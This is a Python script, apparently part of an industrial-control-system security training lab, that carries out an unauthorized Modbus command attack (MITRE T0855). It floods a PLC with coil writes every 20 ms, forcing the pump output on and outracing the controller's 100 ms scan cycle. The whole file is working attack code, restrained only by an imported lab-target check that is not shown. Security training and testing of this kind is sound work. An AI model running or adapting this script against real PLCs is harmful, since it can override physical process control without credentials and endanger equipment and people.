"""
04_unauthorized_write_coil.py - Forzado NO autorizado de la salida (bomba).

MITRE ATT&CK for ICS: T0855 - Unauthorized Command Message (tactica Impair
Process Control, TA0106).
https://attack.mitre.org/techniques/T0855/

A diferencia del setpoint (03_*), la salida "bomba" (coil 0) la recalcula el
propio programa ST del PLC en cada ciclo de scan (cada 100 ms en este
laboratorio), asi que UNA sola escritura Modbus se sobrescribe casi al
instante. Por eso este script no hace una escritura puntual: envia comandos
de forzado repetidos ("bombardeo") durante varios segundos, compitiendo en
frecuencia con el propio ciclo de control del PLC. El resultado no es un
"ON permanente" perfecto, sino que la bomba pasa mucho mas tiempo encendida
del que el control legitimo pretendia — el patron real de un ataque de
"Unauthorized Command Message" contra una salida activamente controlada.

Uso: python 04_unauthorized_write_coil.py [--host 192.168.20.10] [--segundos 10]
"""
import argparse
import time

from pymodbus.client import ModbusTcpClient

from _lab_guard import ensure_lab_target

COIL_BOMBA = 0


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host", default="192.168.20.10")
    parser.add_argument("--port", type=int, default=502)
    parser.add_argument("--unit-id", type=int, default=1)
    parser.add_argument("--segundos", type=int, default=10)
    args = parser.parse_args()

    ensure_lab_target(args.host)

    client = ModbusTcpClient(args.host, port=args.port)
    if not client.connect():
        print(f"[!] No se pudo conectar a {args.host}:{args.port}")
        return

    print(
        f"[*] Forzando el coil {COIL_BOMBA} (bomba) a ON durante "
        f"{args.segundos}s, compitiendo con el ciclo de scan del PLC..."
    )
    escrituras = 0
    fin = time.time() + args.segundos
    try:
        while time.time() < fin:
            resp = client.write_coil(address=COIL_BOMBA, value=True, device_id=args.unit_id)
            if not resp.isError():
                escrituras += 1
            time.sleep(0.02)  # mas rapido que el scan de 100ms del PLC
    finally:
        client.close()

    print(f"[+] {escrituras} escrituras de forzado enviadas sin ninguna credencial.")
    print("[+] Observa el HMI: la bomba habra estado encendida mucho mas de lo esperado.")


if __name__ == "__main__":
    main()
